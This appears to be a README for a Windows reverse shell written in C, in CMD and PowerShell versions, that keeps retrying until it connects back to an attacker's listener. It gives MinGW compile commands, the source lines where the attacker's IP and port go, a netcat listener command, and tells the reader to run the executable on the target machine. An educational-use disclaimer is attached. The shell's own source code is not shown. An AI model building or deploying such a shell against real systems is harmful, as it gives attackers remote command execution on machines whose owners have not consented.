# Windows Reverse Shell in C

A Windows reverse shell written in C that connects back to a listener and awaits commands. 
Features both a CMD and PowerShell version, with persistent connection retry logic.

## Versions
- **Reverse-cmd-shell.c** — proof of concept using `_popen()` to spawn a CMD shell
- **Reverse-powershell-shell.c** — upgraded version using `CreateProcess()` with proper 
pipe redirection to spawn a PowerShell shell, capturing both stdout and stderr

## Usage
Compile with GCC via MinGW:
```
gcc Reverse-cmd-shell.c -o Reverse-cmd-shell -lws2_32
gcc Reverse-powershell-shell.c -o Reverse-powershell-shell -lws2_32
```
Before compiling, set your IP and port in the source file:
```c
routeinfo.sin_addr.s_addr = inet_addr("YOUR_IP_HERE");
routeinfo.sin_port = htons(YOUR_PORT_HERE);
```
Start a listener on your machine:
```
nc -lvnp YOUR_PORT_HERE
```
Then run the compiled executable on the target Windows machine.

## Features
- Persistent connection retry every 5 seconds until listener is available
- Supports any command the respective shell accepts
- Captures both stdout and stderr (PowerShell version)


## Disclaimer
For educational purposes. Use on systems you own or have permission to test.

## License
MIT
